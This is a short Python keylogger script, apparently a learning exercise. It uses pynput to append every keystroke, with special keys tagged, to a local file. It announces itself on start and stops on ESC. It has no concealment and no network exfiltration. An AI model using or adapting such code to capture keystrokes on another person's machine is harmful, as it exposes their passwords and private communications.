from pynput import keyboard
from datetime import datetime

# the v3 has in addition a dictionary of special chars
SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "[ENTER]\n",
    keyboard.Key.tab: "[TAB]\n",
    keyboard.Key.backspace: "[BACKSPACE]\n",
    keyboard.Key.shift: "[SHIFT]\n",
    keyboard.Key.ctrl: "[CTRL]\n",
    keyboard.Key.alt: "[ALT]\n",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.caps_lock: "[CAPS_LOCK]",
    keyboard.Key.up: "[UP]",
    keyboard.Key.down: "[DOWN]",
    keyboard.Key.left: "[LEFT]",
    keyboard.Key.right: "[RIGHT]",
}

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = SPECIAL_KEYS.get(key, f"[{key}]")

    with open("keylog.txt", "a") as f:
        f.write(char)


def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Logging keystrokes, press ESC to stop\n")
    listener.join()